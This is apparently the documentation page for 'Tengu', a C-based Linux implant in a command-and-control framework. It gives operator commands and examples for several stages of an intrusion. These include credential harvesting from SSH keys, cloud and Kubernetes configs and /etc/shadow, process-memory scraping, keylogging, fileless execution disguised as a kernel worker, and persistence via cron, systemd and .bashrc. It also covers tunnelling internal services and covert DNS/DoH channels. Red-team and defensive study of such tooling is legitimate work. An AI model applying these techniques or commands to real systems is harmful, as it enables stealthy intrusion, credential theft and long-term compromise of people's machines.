---
title: Tengu - Linux Agent
description: Lightweight Linux implant written in C.
---

Tengu is the Mugen Linux agent. Written in C, it communicates over HTTP/HTTPS and requires no external dependencies on the target.

## Commands

### Identity

| Command | Description |
|---|---|
| `whoami` | Current username (equivalent to `/usr/bin/whoami`) |
| `whoami /all` | Full identity dump: uid/euid, gid/egid, all groups, Linux capabilities, sudo rights, login session, shell, home |
| `id` | Current user, UID, GID, groups |
| `env` | Environment variables |
| `pwd` | Print working directory |

### Network recon

| Command | Description |
|---|---|
| `netstat` | TCP/TCP6 connections from `/proc/net/tcp` and `/proc/net/tcp6` |
| `arp` | ARP table from `/proc/net/arp` |
| `route` | Routing table from `/proc/net/route` |
| `ifconfig` | Network interfaces and addresses |
| `portscan <target> <ports> [timeout_ms]` | TCP connect scan - no external binary required |

`portscan` supports single IPs, CIDR ranges, port lists, and ranges:

```
portscan 10.0.0.1 22,80,443
portscan 192.168.1.0/24 22,80,443,8080 500
portscan 10.10.10.5 1-1024
```

### File system

| Command | Description |
|---|---|
| `ls [path]` | List directory |
| `cd <path>` | Change working directory |
| `cat <path>` | Read file content |
| `download <path>` | Download file to teamserver |
| `upload <local> <remote>` | Upload file to target |
| `mkdir <path>` | Create directory (recursive) |
| `rm [-r] <path>` | Delete file or directory |
| `cp <src> <dst>` | Copy file |
| `chmod <octal> <path>` | Change file permissions |

### Process management

| Command | Description |
|---|---|
| `ps` | Process list (`/proc` enumeration) |
| `kill <pid>` | Kill process |

### Execution

| Command | Description |
|---|---|
| `shell <cmd>` | Execute via `/bin/sh -c` |
| `inline-execute <elf.o> [args]` | Execute an ELF BOF in-process |
| `memfd <local_elf> [args]` | Execute ELF in-memory - no disk write |
| `screenshot` | Capture screen via `scrot`, `grim`, or `import` |

#### `memfd` - in-memory execution

`memfd` sends a local ELF binary to the agent and executes it entirely in memory using `memfd_create` + `/proc/self/fd/<n>`. Zero bytes are written to disk on the target.

```
memfd /tools/linpeas.sh
memfd /tools/mimipenguin arg1 arg2
```

The process appears in `/proc` with the name `kworker/u:0`. Stdout and stderr are captured and returned as a single output.

### Credential access

| Command | Description |
|---|---|
| `harvest` | Collect credentials from the filesystem |
| `procdump [pid\|all]` | Scan process memory for credential patterns |
| `keylog [seconds]` | Capture keystrokes for N seconds (default: 30) |

#### `harvest`

One-shot credential collection - no arguments. Scans:

- SSH private keys (`~/.ssh/id_*`) and config
- Shell history tail: bash, zsh, fish
- Cloud tokens: AWS (`~/.aws/credentials`), GCP, Azure
- Git credentials: `~/.git-credentials`, `~/.gitconfig`
- Docker registry auth: `~/.docker/config.json`
- Kubernetes config: `~/.kube/config`
- Database credentials: `~/.pgpass`, `~/.netrc`, `~/.mysql_history`
- Package manager tokens: `~/.npmrc`, pip config
- `/etc/shadow` (if readable - root sessions)
- Environment variables matching credential-related keywords

#### `procdump`

Reads `/proc/<pid>/mem` directly (no ptrace, no process pause) and scans readable memory regions for credential patterns: passwords, secrets, tokens, AWS keys, JWTs, PEM blocks, Authorization headers.

```
procdump 1234      # scan specific PID
procdump all       # scan all accessible processes
```

Access to other users' processes requires root or `ptrace_scope=0`. Reading your own processes always works.

#### `keylog`

```
keylog 60     # capture for 60 seconds
keylog        # default: 30 seconds
```

Tries `/dev/input/eventX` first (requires `input` group or root). Falls back to X11 via `dlopen("libX11.so.6")` - works for any user with a graphical session without recompiling.

### Persistence

```
persist cron <path> [interval]    # crontab entry, default: */5 * * * *
persist systemd <path>            # .service unit (root: /etc/systemd/system/, user: ~/.config/systemd/user/)
persist bash <path>               # nohup entry in ~/.bashrc (dedup-safe)
```

### Reverse port forward

```
rportfwd add <bind_port> <internal_host> <internal_port>
rportfwd list
rportfwd rm <bind_port>
```

Expose an internal service to the operator through the C2 channel without a SOCKS5 proxy.

The teamserver opens a TCP listener on `bind_port`. When an external client connects, the agent is instructed to connect to `internal_host:internal_port`. All data flows bidirectionally over the C2 HTTP channel.

```
# Expose an SSH server that is only reachable from the agent
rportfwd add 2222 192.168.10.5 22

# Connect from the operator box
ssh -p 2222 user@<teamserver_ip>

# Expose an internal web app
rportfwd add 8080 10.0.0.100 80
```

Multiple rules can be active simultaneously. Each rule supports multiple concurrent connections.

### Other

```
sleep <seconds> [jitter%]
socks5 start [port]   # SOCKS5 proxy over C2 channel (default: 1080)
socks5 stop
task list | clear
info    # local session info, no round-trip
help    # command list
exit    # terminate the agent
```

---

## ELF BOF loader

Tengu executes x86\_64 ELF relocatable objects (`.o`) in-process via `inline-execute`. Linux equivalent of Cobalt Strike / Havoc BOF execution.

### BeaconAPI

| Function | Description |
|---|---|
| `BeaconPrintf(type, fmt, ...)` | Print formatted output |
| `BeaconOutput(type, data, len)` | Output raw bytes |
| `BeaconDataParse(parser, data, len)` | Initialize a data parser |
| `BeaconDataExtract(parser, &len)` | Extract next string |
| `BeaconDataInt(parser)` | Extract next 4-byte int |
| `BeaconDataShort(parser)` | Extract next 2-byte short |
| `BeaconFormatAlloc(fmt, max)` | Allocate a format buffer |
| `BeaconFormatPrintf(fmt, ...)` | Append formatted string |
| `BeaconFormatFree(fmt)` | Free format buffer |
| `BeaconFormatToString(fmt, &len)` | Get format buffer as string |
| `BeaconIsAdmin()` | Returns 1 if running as root |

Unknown symbols fall through to `dlsym(RTLD_DEFAULT)` - libc and any library loaded in the process are available.

### Writing a BOF

```c
#include "beacon.h"

void go(char* args, int len) {
    datap parser;
    BeaconDataParse(&parser, args, len);
    char* target = BeaconDataExtract(&parser, NULL);
    BeaconPrintf(CALLBACK_OUTPUT, "Target: %s\n", target);
}
```

```bash
gcc -c -o mybof.x64.o mybof.c
```

---

## Payload generation

Payloads are compiled by the teamserver at generation time using `gcc`. The C2 config is embedded as a byte array at compile time.

### Transport options

| Transport | Description |
|---|---|
| HTTP / HTTPS | Default. Standard HTTP POST to the configured URI. |
| DNS | TXT record polling. Frames encoded as base32 in QNAME labels. |
| DoH | DNS-over-HTTPS. Same DNS protocol over HTTPS POST `/dns-query`. |
| TCP | TCP socket. Used when pivoting through a Demon parent agent. |

### Application-layer encryption

All transports support **ChaCha20 application-layer encryption**. A 32-byte key is generated at payload build time and embedded in the agent config. After the initial registration (INIT), all frames are encrypted regardless of transport - even over plain HTTP.

The key is negotiated once at INIT and never re-sent.

### Configurable options

| Option | Description |
|---|---|
| Sleep / Jitter | Check-in interval and randomization percentage |
| User-Agent | HTTP User-Agent string (for HTTP/HTTPS transport) |
| Kill Date | Agent terminates itself after this date (`YYYY-MM-DD`) |
| Working Hours | Agent only beacons within this time window (e.g. `8:00-18:00`) |

Supported output: ELF64 executable.
